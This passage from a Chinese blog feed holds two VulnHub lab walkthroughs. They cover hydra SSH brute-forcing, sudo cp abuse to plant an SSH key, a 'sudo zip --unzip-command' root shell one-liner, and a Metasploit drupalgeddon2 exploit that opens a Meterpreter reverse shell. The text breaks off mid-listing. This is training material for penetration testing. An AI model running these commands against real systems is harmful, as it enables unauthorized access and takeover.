class="line">him</span><br><span class="line">this</span><br><span class="line">Dhram</span><br><span class="line">Eternal</span><br><span class="line">Truth</span><br><span class="line">war</span><br><span class="line">You</span><br><span class="line">CTF</span><br><span class="line">Warrior</span><br><span class="line">Pick</span><br><span class="line">your</span><br><span class="line">attain</span><br><span class="line">Boot</span><br><span class="line">Hacking</span><br><span class="line">Articles</span><br><span class="line">All</span><br><span class="line">rights</span><br><span class="line">reserved</span><br><span class="line">Scripts</span><br><span class="line">Raj</span><br><span class="line">Aarti</span><br><span class="line">Geet</span><br><span class="line">Yashika</span><br><span class="line">Kavish</span><br><span class="line">Rishab</span><br><span class="line">Japneet</span><br><span class="line">Pavan</span><br></pre></td></tr></table></figure>

<h3 id="爆破ssh的用户名和密码"><a href="#爆破ssh的用户名和密码" class="headerlink" title="爆破ssh的用户名和密码"></a>爆破ssh的用户名和密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -L dict1.txt -P dict1.txt ssh://192.168.142.131 -s 65345 -I -e nsr -f</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-17 22:03:33</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 13338 login tries (l:114/p:117), ~834 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.142.131:65345/</span><br><span class="line">[STATUS] 214.00 tries/min, 214 tries <span class="keyword">in</span> 00:01h, 13127 to <span class="keyword">do</span> <span class="keyword">in</span> 01:02h, 16 active</span><br><span class="line">[STATUS] 149.67 tries/min, 449 tries <span class="keyword">in</span> 00:03h, 12892 to <span class="keyword">do</span> <span class="keyword">in</span> 01:27h, 16 active</span><br><span class="line">[STATUS] 154.14 tries/min, 1079 tries <span class="keyword">in</span> 00:07h, 12262 to <span class="keyword">do</span> <span class="keyword">in</span> 01:20h, 16 active</span><br><span class="line">[STATUS] 154.67 tries/min, 2320 tries <span class="keyword">in</span> 00:15h, 11024 to <span class="keyword">do</span> <span class="keyword">in</span> 01:12h, 16 active</span><br><span class="line"></span><br><span class="line">[STATUS] 151.68 tries/min, 4702 tries <span class="keyword">in</span> 00:31h, 8643 to <span class="keyword">do</span> <span class="keyword">in</span> 00:57h, 16 active</span><br><span class="line">[STATUS] 151.43 tries/min, 7117 tries <span class="keyword">in</span> 00:47h, 6229 to <span class="keyword">do</span> <span class="keyword">in</span> 00:42h, 16 active</span><br><span class="line">[65345][ssh] host: 192.168.142.131   login: pinak   password: Gandiv</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.142.131 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-17 22:56:20</span><br></pre></td></tr></table></figure>

<ul>
<li>用户名/密码  ——  pinak/Gandiv</li>
</ul>
<p>现在有了SSH的登录凭据，pinak/Gandiv登录并进行查看。 运行sudo -l命令检查sudoers列表，发现有效的cp命令以sarang用户身份运行，没有任何密码，因此可以使用它。 看一下用户sarang。 在sarang的主目录中，看到一个标记为“ .ssh”的隐藏目录。 试图打开它，但受到限制。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh pinak@192.168.142.131 -p 65345</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.142.131]:65345 ([192.168.142.131]:65345)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.142.131]:65345<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">pinak@192.168.142.131&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">Last login: Fri Nov  8 09:05:56 2019</span><br><span class="line">pinak@ubuntu:~$ id</span><br><span class="line">uid=1001(pinak) gid=1001(pinak) groups=1001(pinak)</span><br><span class="line">pinak@ubuntu:~$ whoami</span><br><span class="line">pinak</span><br><span class="line">pinak@ubuntu:~$ </span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/pinak</span><br><span class="line">pinak@ubuntu:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> pinak on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User pinak may run the following commands on ubuntu:</span><br><span class="line">    (sarang) NOPASSWD: /bin/cp</span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">cd</span> /home/sarang</span><br><span class="line">pinak@ubuntu:/home/sarang$ ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 4 sarang sarang 4096 Nov  8 08:03 .</span><br><span class="line">drwxr-xr-x 5 root   root   4096 Nov  7 21:01 ..</span><br><span class="line">-rw------- 1 sarang sarang    1 Nov  8 09:07 .bash_history</span><br><span class="line">-rw-r--r-- 1 sarang sarang  220 Nov  7 21:01 .bash_logout</span><br><span class="line">-rw-r--r-- 1 sarang sarang 3771 Nov  7 21:01 .bashrc</span><br><span class="line">drwx------ 2 sarang sarang 4096 Nov  7 21:07 .cache</span><br><span class="line">-rw-r--r-- 1 sarang sarang  807 Nov  7 21:01 .profile</span><br><span class="line">drwx------ 2 sarang sarang 4096 Nov  7 21:35 .ssh</span><br><span class="line">pinak@ubuntu:/home/sarang$ <span class="built_in">cd</span> .ssh</span><br><span class="line">-bash: <span class="built_in">cd</span>: .ssh: Permission denied</span><br></pre></td></tr></table></figure>

<p>使用cp命令进入sarang用户。 需要将ssh密钥显示在sarang用户主目录内的.ssh目录中。 尽管该文件只能读取，但可以使用cp命令在该目录中发送密钥。 为此，首先需要生成这些密钥。 为此使用ssh-keygen。 使用ssh-keygen后，进入pinak用户主目录内的.ssh目录中以找到id_rsa公钥。 给它适当的权限。 并将其移动到pinak用户主目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pinak@ubuntu:~$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/pinak/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/pinak/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/pinak/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:M3EjxpbK4Ni6vFhkYjtaUWnV7IRl6gK/2ab8B3FLz+U pinak@ubuntu</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|      .=o        |</span></span><br><span class="line"><span class="string">|     o.++.       |</span></span><br><span class="line"><span class="string">|  . = .oB o      |</span></span><br><span class="line"><span class="string">|   O +.+++ ..    |</span></span><br><span class="line"><span class="string">|..= = ++S+ o     |</span></span><br><span class="line"><span class="string">|.+.o =. .oo E    |</span></span><br><span class="line"><span class="string">| o+ o o.         |</span></span><br><span class="line"><span class="string">|.=.o o  .        |</span></span><br><span class="line"><span class="string">|o +.o...         |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">pinak@ubuntu:~$ cd .ssh</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ ls</span></span><br><span class="line"><span class="string">id_rsa  id_rsa.pub</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ chmod 777 id_rsa.pub</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ cp id_rsa.pub /home/pinak</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ cd ..</span></span><br><span class="line"><span class="string">pinak@ubuntu:~$ ls</span></span><br><span class="line"><span class="string">id_rsa.pub</span></span><br></pre></td></tr></table></figure>

<p>现在已经转移了公钥，现在使用cp命令作为sarang用户在sarang用户主目录中的.ssh目录中复制公钥了。 需要将sudo与cp命令一起使用，并提供源目录和目标目录。 完成此操作后，只需要使用刚转让的密钥以sarang身份登录即可。 可以看到它运行良好。 以成功的用户身份登录后，再次运行sudo -l命令，因为该用户不是root用户，目标是获得root用户。 看到zip命令具有sudo权限，可滥用该权限来升级此计算机上的特权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pinak@ubuntu:~$ sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys</span><br><span class="line">pinak@ubuntu:~$ ssh sarang@127.0.0.1 -i /.ssh/authorized_keys -p 65345</span><br><span class="line">Warning: Identity file /.ssh/authorized_keys not accessible: No such file or directory.</span><br><span class="line">The authenticity of host <span class="string">&#x27;[127.0.0.1]:65345 ([127.0.0.1]:65345)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[127.0.0.1]:65345<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/home/pinak/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 21:35:24 2019 from 192.168.0.100</span></span><br><span class="line"><span class="string">sarang@ubuntu:~$ sudo -l</span></span><br><span class="line"><span class="string">Matching Defaults entries for sarang on ubuntu:</span></span><br><span class="line"><span class="string">    env_reset, mail_badpass,</span></span><br><span class="line"><span class="string">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User sarang may run the following commands on ubuntu:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/bin/zip</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用最近通过ssh登录的用户sarang。 使用sudo命令列出用户可以使用root特权运行的所有命令，可以看到用户可以以root用户身份运行zip命令，而无需输入任何密码。<br>因此，现在正在将权限从“sarang”提升到“root”。 创建一个文件“lucifer11”，然后执行命令：首先将文件“lucifer11”压缩，然后将其移动到/tmp/lucifer11.zip文件夹，最后解压缩，然后弹出root的shell，提权成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sarang@ubuntu:~$ touch lucifer11</span><br><span class="line">sarang@ubuntu:~$ ls</span><br><span class="line">lucifer11</span><br><span class="line">sarang@ubuntu:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/sarang</span><br><span class="line">sarang@ubuntu:~$ sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br><span class="line">  adding: home/sarang/lucifer11 (stored 0%)</span><br><span class="line">root@ubuntu:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>这次提权方式太帅，记下来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>

<p>获取flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># cd /root</span></span><br><span class="line">root@ubuntu:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@ubuntu:/root<span class="comment"># cat flag.txt </span></span><br><span class="line">          </span><br><span class="line">                                            @p</span><br><span class="line">                                           @@@.</span><br><span class="line">                                          @@@@@</span><br><span class="line">                                         @@@@@@@</span><br><span class="line">                                        *<span class="string">&quot;`]@P ^^</span></span><br><span class="line"><span class="string">                                           ]@P</span></span><br><span class="line"><span class="string">                                           ]@P</span></span><br><span class="line"><span class="string">                               ,,,,        ]@P       ,,gg,,</span></span><br><span class="line"><span class="string">                           g@@@@@@@@@b     ]@P    ,@@@@@@@@@@g,</span></span><br><span class="line"><span class="string">                        ,@@@@@@BNPPNB@@@@@@@@@@@@@@@@P**PNB@@@@@w</span></span><br><span class="line"><span class="string">                      g@@@@P^`        %NNNNN@NNNNNP          *B@@@g</span></span><br><span class="line"><span class="string">                    g@@@P`                 -@                   &quot;</span>B@@w</span><br><span class="line">                  ,@@@`                    ]@                      %@@,</span><br><span class="line">                 @@P-                      ]@                        *@@,</span><br><span class="line">              ,@@<span class="string">&quot;                         ]@                          *B@</span></span><br><span class="line"><span class="string">            ,@N&quot;</span>                          y@@B                            %@,</span><br><span class="line">      ,,  g@P-                            ]@@@P                             *Bg ,gg</span><br><span class="line">      @@@@$,,,,,,,,,,,,,,,,,,,,,,,,,,ggggg@@@@wwwwwwwwwgggggggggww==========mm4NNN<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">!! Congrats you have finished this task !!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Contact us here:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hacking Articles : https://twitter.com/rajchandel/</span></span><br><span class="line"><span class="string">Nisha Sharma     : https://in.linkedin.com/in/nishasharmaa</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span></span><br><span class="line"><span class="string"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">____________________________________</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub67.jpg"></p>
<p>Flag太帅，犹如利剑正中敌人心脏！！！然后狠狠穿透！！！</p>
<p><font color="red">Key:网页用户名收集，hydra爆破,ssh公钥滥用,/usr/bin/zip,/bin/cp的无需root密码的权限滥用。</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[hackNos-Os-hackNos-1]</title>
    <url>/2019/12/22/hackNos-Os-hackNos-1/</url>
    <content><![CDATA[<p>名称：hackNos：Os-hackNos<br>发布日期：2019年11月27日</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MUlPcFhpYmYtQTlpU3dvRzRJVzhIZFhGdkRCRm95N04x">https://drive.google.com/open?id=1IOpXibf-A9iSwoG4IW8HdXFvDBFoy7N1<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMS5vdmE=">https://download.vulnhub.com/hacknos/Os-hackNos-1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMS5vdmEudG9ycmVudA==">https://download.vulnhub.com/hacknos/Os-hackNos-1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：<br>难度：容易中级<br>flag：2个flag第一个user.txt和第二个root.txt<br>学习：利用 Web应用程序 枚举 权限提升</p>
<a id="more"></a>

<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>配置和hackNos-Os-hackNos-2-1一样，<a href="https://fdlucifer.github.io/2019-12-19-hackNos-Os-hackNos-2-1.html">传送门</a></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫描一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.103</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line">MAC Address: 08:00:27:F9:4E:C0 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.56.103</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br></pre></td></tr></table></figure>

<p>可以看到开放了22的ssh端口和80端口</p>
<p>dirb扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.103/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 22 21:06:26 2019</span><br><span class="line">URL_BASE: http://192.168.56.103/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.103/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/                                                          </span><br><span class="line">+ http://192.168.56.103/index.html (CODE:200|SIZE:11321)                                              </span><br><span class="line">+ http://192.168.56.103/server-status (CODE:403|SIZE:279)                                             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.103/drupal/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/includes/                                                 </span><br><span class="line">+ http://192.168.56.103/drupal/index.php (CODE:200|SIZE:7687)                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/misc/                                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/modules/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/profiles/                                                 </span><br><span class="line">+ http://192.168.56.103/drupal/robots.txt (CODE:200|SIZE:2189)                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/scripts/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/sites/                                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/drupal/themes/                                                   </span><br><span class="line">+ http://192.168.56.103/drupal/web.config (CODE:200|SIZE:2200)                                        </span><br><span class="line">+ http://192.168.56.103/drupal/xmlrpc.php (CODE:200|SIZE:42)</span><br></pre></td></tr></table></figure>

<p>发现存在drupal服务</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub81.jpg"></p>
<p>dirbuster再爆破一波.txt后缀的文件</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub82.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.103/alexander.txt</span><br></pre></td></tr></table></figure>

<p>base64字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==</span><br></pre></td></tr></table></figure>

<p>将base64字符串解密</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo &quot;KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==&quot;  | base64 -d</span></span><br><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ ++.-- ----- --.&lt;+ ++[-&gt; +++&lt;] &gt;+++.</span><br><span class="line">----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- ----- -&lt;]&gt;- ----- --.&lt;+</span><br><span class="line">++[-&gt; +++&lt;] &gt;++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;. ++.++ +++++ +.--- ---.&lt; +++[-</span><br><span class="line">&gt;+++&lt; ]&gt;+++ +.&lt;++ +++++ [-&gt;-- ----- &lt;]&gt;-. &lt;+++[ -&gt;--- &lt;]&gt;-- -.+.- ---.+</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure>

<p>可以看出是brain-fuck加密的字符串，到<span class="exturl" data-url="aHR0cHM6Ly93d3cuc3BsaXRicmFpbi5vcmcvc2VydmljZXMvb29r">Brainfuck/Ook! Obfuscation/Encoding<i class="fa fa-external-link-alt"></i></span>解密。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub83.jpg"></p>
<p>得到账号密码：james/Hacker@4514，登录。</p>
<h3 id="getshell得到第一个flag"><a href="#getshell得到第一个flag" class="headerlink" title="getshell得到第一个flag"></a>getshell得到第一个flag</h3><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub84.jpg"></p>
<p>发现是 7.57 版本，存在drupalgeddon2远程代码执行</p>
<p>使用msf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"><span class="comment"># cowsay++                                                                                                                                                                                                                                 </span></span><br><span class="line"> ____________                                                                                                                                                                                                                              </span><br><span class="line">&lt; metasploit &gt;                                                                                                                                                                                                                             </span><br><span class="line"> ------------                                                                                                                                                                                                                              </span><br><span class="line">       \   ,__,                                                                                                                                                                                                                            </span><br><span class="line">        \  (oo)____                                                                                                                                                                                                                        </span><br><span class="line">           (__)    )\                                                                                                                                                                                                                      </span><br><span class="line">              ||--|| *                                                                                                                                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">       =[ metasploit v5.0.64-dev                          ]                                                                                                                                                                                </span><br><span class="line">+ -- --=[ 1952 exploits - 1089 auxiliary - 335 post       ]                                                                                                                                                                                </span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]                                                                                                                                                                                </span><br><span class="line">+ -- --=[ 7 evasion                                       ]                                                                                                                                                                                </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">msf5 &gt; search Drupalgeddon2                                                                                                                                                                                                                </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Matching Modules                                                                                                                                                                                                                           </span><br><span class="line">================                                                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank       Check  Description                                                                                                                                             </span></span><br><span class="line">   -  ----                                      ---------------  ----       -----  -----------                                                                                                                                             </span><br><span class="line">   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                                                                      </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2                                                                                                                                                                                        </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> rhost 192.168.56.103</span><br><span class="line">rhost =&gt; 192.168.56.103</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> targeturi /drupal</span><br><span class="line">targeturi =&gt; /drupal</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.102:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.56.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.56.102:4444 -&gt; 192.168.56.103:58828) at 2019-12-22 22:08:44 -0500</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/html/drupal</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100777/rwxrwxrwx  317     fil   2018-02-21 12:28:43 -0500  .editorconfig</span><br><span class="line">100777/rwxrwxrwx  174     fil   2018-02-21 12:28:43 -0500  .gitignore</span><br><span class="line">100777/rwxrwxrwx  6112    fil   2018-02-21 12:28:43 -0500  .htaccess</span><br><span class="line">100777/rwxrwxrwx  111736  fil   2018-02-21 12:28:43 -0500  CHANGELOG.txt</span><br><span class="line">100777/rwxrwxrwx  1481    fil   2018-02-21 12:28:43 -0500  COPYRIGHT.txt</span><br><span class="line">100777/rwxrwxrwx  1717    fil   2018-02-21 12:28:43 -0500  INSTALL.mysql.txt</span><br><span class="line">100777/rwxrwxrwx  1874    fil   2018-02-21 12:28:43 -0500  INSTALL.pgsql.txt</span><br><span class="line">100777/rwxrwxrwx  1298    fil   2018-02-21 12:28:43 -0500  INSTALL.sqlite.txt</span><br><span class="line">100777/rwxrwxrwx  17995   fil   2018-02-21 12:28:43 -0500  INSTALL.txt</span><br><span class="line">100777/rwxrwxrwx  18092   fil   2016-11-16 18:57:05 -0500  LICENSE.txt</span><br><span class="line">100777/rwxrwxrwx  8710    fil   2018-02-21 12:28:43 -0500  MAINTAINERS.txt</span><br><span class="line">100777/rwxrwxrwx  5382    fil   2018-02-21 12:28:43 -0500  README.txt</span><br><span class="line">100777/rwxrwxrwx  10123   fil   2018-02-21 12:28:43 -0500  